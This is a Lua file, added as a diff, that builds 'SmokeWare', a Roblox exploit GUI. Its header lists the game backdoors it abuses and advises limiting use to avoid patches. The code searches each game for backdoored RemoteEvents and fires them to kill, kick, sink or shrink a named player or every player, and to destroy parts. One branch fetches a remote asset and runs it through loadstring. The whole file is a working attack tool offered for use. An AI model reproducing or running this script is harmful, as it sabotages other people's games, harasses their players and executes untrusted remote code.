@@ -1,0 +1,305 @@
+--[[
+Backdoors:
+-KickParts, Kill Remotes, Destroy Remotes
+-Bru Remote
+-Harked Remote
+-Voxel Remote
+-InternalUI parasite
+-ServerSide event maker
+-UTG stealer
+
+Credits:
+LuaE, Outmoon, rosmoker, Reggie, TypicalModders, Scrambles
+
+Instructions:
+To ensure a longer lifespan for this script, please do not overuse and abuse this script on any game. Overusing may cause the script to be patched.
+If you execute this script and a serverside executor appears, wait 30 seconds and then start using it.
+If you execute this script and it doesn't work, use it on a different game.
+]]
+
+-- Instances
+
+local o = Instance.new("ScreenGui")
+local main = Instance.new("Frame")
+local TextLabel = Instance.new("TextLabel")
+local UIListLayout = Instance.new("UIListLayout")
+local TextLabel_2 = Instance.new("TextLabel")
+local kill = Instance.new("TextButton")
+local kick = Instance.new("TextButton")
+local btools = Instance.new("TextButton")
+local sink = Instance.new("TextButton")
+local skinny = Instance.new("TextButton")
+local target = Instance.new("TextBox")
+
+-- Properties
+
+o.Name = "o"
+o.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+o.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+main.Name = "main"
+main.Parent = o
+main.BackgroundColor3 = Color3.new(0.105882, 0.105882, 0.105882)
+main.BorderSizePixel = 0
+main.Position = UDim2.new(0.73161763, 0, 0.345381528, 0)
+main.Size = UDim2.new(0, 246, 0, 290)
+
+TextLabel.Parent = main
+TextLabel.BackgroundColor3 = Color3.new(0.0862745, 0.0862745, 0.0862745)
+TextLabel.BorderSizePixel = 0
+TextLabel.Size = UDim2.new(0, 246, 0, 39)
+TextLabel.Font = Enum.Font.SourceSans
+TextLabel.Text = "SmokeWare"
+TextLabel.TextColor3 = Color3.new(1, 1, 1)
+TextLabel.TextScaled = true
+TextLabel.TextSize = 14
+TextLabel.TextWrapped = true
+
+UIListLayout.Parent = main
+UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+
+TextLabel_2.Parent = main
+TextLabel_2.BackgroundColor3 = Color3.new(0.0862745, 0.0862745, 0.0862745)
+TextLabel_2.BorderSizePixel = 0
+TextLabel_2.Position = UDim2.new(0, 0, 0.134482756, 0)
+TextLabel_2.Size = UDim2.new(0, 246, 0, 21)
+TextLabel_2.Font = Enum.Font.SourceSans
+TextLabel_2.Text = "Scripts by LuaE and rosmoker, UI by rosmoker"
+TextLabel_2.TextColor3 = Color3.new(1, 1, 1)
+TextLabel_2.TextScaled = true
+TextLabel_2.TextSize = 14
+TextLabel_2.TextWrapped = true
+
+kill.Name = "kill"
+kill.Parent = main
+kill.BackgroundColor3 = Color3.new(0.0352941, 0.0352941, 0.0352941)
+kill.BorderSizePixel = 0
+kill.Position = UDim2.new(0, 0, 0.206896558, 0)
+kill.Size = UDim2.new(0, 246, 0, 31)
+kill.Font = Enum.Font.SourceSans
+kill.Text = "Kill"
+kill.TextColor3 = Color3.new(1, 1, 1)
+kill.TextScaled = true
+kill.TextSize = 14
+kill.TextWrapped = true
+
+kick.Name = "kick"
+kick.Parent = main
+kick.BackgroundColor3 = Color3.new(0.0352941, 0.0352941, 0.0352941)
+kick.BorderSizePixel = 0
+kick.Position = UDim2.new(0, 0, 0.206896558, 0)
+kick.Size = UDim2.new(0, 246, 0, 31)
+kick.Font = Enum.Font.SourceSans
+kick.Text = "Kick"
+kick.TextColor3 = Color3.new(1, 1, 1)
+kick.TextScaled = true
+kick.TextSize = 14
+kick.TextWrapped = true
+
+btools.Name = "btools"
+btools.Parent = main
+btools.BackgroundColor3 = Color3.new(0.0352941, 0.0352941, 0.0352941)
+btools.BorderSizePixel = 0
+btools.Position = UDim2.new(0, 0, 0.206896558, 0)
+btools.Size = UDim2.new(0, 246, 0, 31)
+btools.Font = Enum.Font.SourceSans
+btools.Text = "Btools"
+btools.TextColor3 = Color3.new(1, 1, 1)
+btools.TextScaled = true
+btools.TextSize = 14
+btools.TextWrapped = true
+
+sink.Name = "sink"
+sink.Parent = main
+sink.BackgroundColor3 = Color3.new(0.0352941, 0.0352941, 0.0352941)
+sink.BorderSizePixel = 0
+sink.Position = UDim2.new(0, 0, 0.206896558, 0)
+sink.Size = UDim2.new(0, 246, 0, 31)
+sink.Font = Enum.Font.SourceSans
+sink.Text = "Sink"
+sink.TextColor3 = Color3.new(1, 1, 1)
+sink.TextScaled = true
+sink.TextSize = 14
+sink.TextWrapped = true
+
+skinny.Name = "skinny"
+skinny.Parent = main
+skinny.BackgroundColor3 = Color3.new(0.0352941, 0.0352941, 0.0352941)
+skinny.BorderSizePixel = 0
+skinny.Position = UDim2.new(0, 0, 0.206896558, 0)
+skinny.Size = UDim2.new(0, 246, 0, 31)
+skinny.Font = Enum.Font.SourceSans
+skinny.Text = "Skinny"
+skinny.TextColor3 = Color3.new(1, 1, 1)
+skinny.TextScaled = true
+skinny.TextSize = 14
+skinny.TextWrapped = true
+
+target.Name = "target"
+target.Parent = main
+target.BackgroundColor3 = Color3.new(0, 0, 0)
+target.BorderSizePixel = 0
+target.Position = UDim2.new(0, 0, 0.741379321, 0)
+target.Size = UDim2.new(0, 246, 0, 36)
+target.Font = Enum.Font.SourceSans
+target.PlaceholderText = "Target's Name"
+target.Text = ""
+target.TextColor3 = Color3.new(1, 1, 1)
+target.TextScaled = true
+target.TextSize = 14
+target.TextWrapped = true
+
+-- Scripts
+
+local function QWEB_fake_script() -- main.Dragify 
+	local script = Instance.new('LocalScript', main)
+
+	local UIS = game:GetService("UserInputService")
+	function dragify(Frame)
+	    dragToggle = nil
+	    local dragSpeed = 0
+	    dragInput = nil
+	    dragStart = nil
+	    local dragPos = nil
+	    function updateInput(input)
+	        local Delta = input.Position - dragStart
+	        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
+	        game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.25), {Position = Position}):Play()
+	    end
+	    Frame.InputBegan:Connect(function(input)
+	        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
+	            dragToggle = true
+	            dragStart = input.Position
+	            startPos = Frame.Position
+	            input.Changed:Connect(function()
+	                if input.UserInputState == Enum.UserInputState.End then
+	                    dragToggle = false
+	                end
+	            end)
+	        end
+	    end)
+	    Frame.InputChanged:Connect(function(input)
+	        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+	            dragInput = input
+	        end
+	    end)
+	    game:GetService("UserInputService").InputChanged:Connect(function(input)
+	        if input == dragInput and dragToggle then
+	            updateInput(input)
+	        end
+	    end)
+	end
+	
+	dragify(script.Parent)
+end
+coroutine.wrap(QWEB_fake_script)()
+
+--slaves work
+
+for i,slaves in pairs(game:GetDescendants()) do
+	if slaves.Name == "DestroySegway" or slaves.Name == "" or slaves.Name == "Destroy" or slaves.Name == " " or slaves.Name == "votekick" or slaves.Name == "kick" or slaves.Name == "btools" or slaves.Name == "UndoHasWelded" or slaves.Name == "MutePlayerRequest" or slaves.Name == "UnMutePlayerRequest" or slaves.Name == "kill" or slaves.Name == "break" or slaves.Name == "destroying" or slaves.Name == "DestroyRemote" or slaves.Name == "ServerSide" or slaves.Name == "RemoteEvent" or slaves.Name == "ServerRemote" or slaves.Name == "RS" or slaves.Name == "killplayer" then
+		print("no u")
+
+		kill.MouseButton1Down:connect(function()
+			if string.lower(target.Text) == "all" then
+				for i,c in pairs(game.Players:GetPlayers()) do
+					ohok = c.Character["Head"]
+					slaves:FireServer(ohok, {Value = ohok})
+				end
+			else
+				if game.Players:FindFirstChild(target.Text) then
+					if game.Players:FindFirstChild(target.Text).Character then
+						slaves:FireServer(game.Players:FindFirstChild(target.Text).Character.Head, {Value = game.Players:FindFirstChild(target.Text).Character.Head}) else
+						print("who?????")
+
+					end
+
+				end
+
+			end
+		end)
+
+		btools.MouseButton1Down:connect(function()
+			local Tool = Instance.new("Tool",game.Players.LocalPlayer.Backpack)
+			local Equipped = false
+
+			Tool.RequiresHandle = false
+			Tool.Name = "Destroy Tool"
+			local Field = Instance.new("SelectionBox",game.Workspace)
+			local Mouse = game.Players.LocalPlayer:GetMouse()
+			Field.LineThickness = 0.1
+
+			Tool.Equipped:connect(function()
+				Equipped = true
+
+				while Equipped == true do
+					if Mouse.Target ~= nil then
+						Field.Adornee = Mouse.Target
+
+					else
+						Field.Adornee = nil
+					end
+					wait()
+				end
+			end)
+
+			Tool.Unequipped:connect(function()
+				Equipped = false
+				Field.Adornee = nil
+			end)
+
+			Tool.Activated:connect(function()
+				if Mouse.Target ~= nil then
+					slaves:FireServer(Mouse.Target, {Value = Mouse.Target})
+					local AttemptTarget = Mouse.Target
+					while AttemptTarget ~= nil do
+						AttemptTarget.Velocity = Vector3.new(0,-1000000000000000,0)
+						AttemptTarget.CanCollide = false
+						wait()
+					end
+
+				end
+			end)
+		end)
+
+		sink.MouseButton1Down:connect(function()
+			if string.lower(target.Text) == "all" then
+				for i,c in pairs(game.Players:GetPlayers()) do
+					ohok = c.Character.HumanoidRootPart
+					slaves:FireServer(ohok, {Value = ohok})
+				end
+			else
+				slaves:FireServer(game.Players:FindFirstChild(target.Text).Character["HumanoidRootPart"], {Value = game.Players:FindFirstChild(target.Text).Character["HumanoidRootPart"]})
+			end
+		end)
+
+		kick.MouseButton1Down:connect(function()
+			if string.lower(target.Text) == "all" then
+				for i,c in pairs(game.Players:GetPlayers()) do
+					ohok = c
+					slaves:FireServer(ohok, {Value = ohok})
+				end
+			else
+				slaves:FireServer(game.Players:FindFirstChild(target.Text), {Value = game.Players:FindFirstChild(target.Text)})
+			end
+		end)
+		
+		skinny.MouseButton1Down:connect(function()
+			if string.lower(target.Text) == "all" then
+				for i,c in pairs(game.Players:GetPlayers()) do
+					ohok = c.Character:FindFirstChildWhichIsA('Humanoid').BodyDepthScale
+					slaves:FireServer(ohok, {Value = ohok})
+				end
+			else
+				slaves:FireServer(game.Players:FindFirstChild(target.Text).Character:FindFirstChildWhichIsA('Humanoid').BodyDepthScale, {Value = game.Players:FindFirstChild(target.Text).Character:FindFirstChildWhichIsA('Humanoid').BodyDepthScale})
+			end
+		end)
+		if slaves.Name == "MutePlayerRequest" or slaves.Name == "insert" or slaves.Name == "ServerSide" or slaves.Name == "Load" or slaves.Name == "execute" or slaves.Name == "add" or slaves.Name == "new" or slaves.Name == "open" or slaves.Name == "duplicate" or slaves.Name == "dupe" then
+			slaves:FireServer(loadstring(game:GetObjects('rbxassetid://13691688154')[1].Source)())
+		end
+		if slaves.Name == "getutg" or slaves.Name == "utg" or slaves.Name == "trollinggui" then
+			slaves:FireServer(game.Players.LocalPlayer.PlayerScripts)
+		end
+	end
+end
+
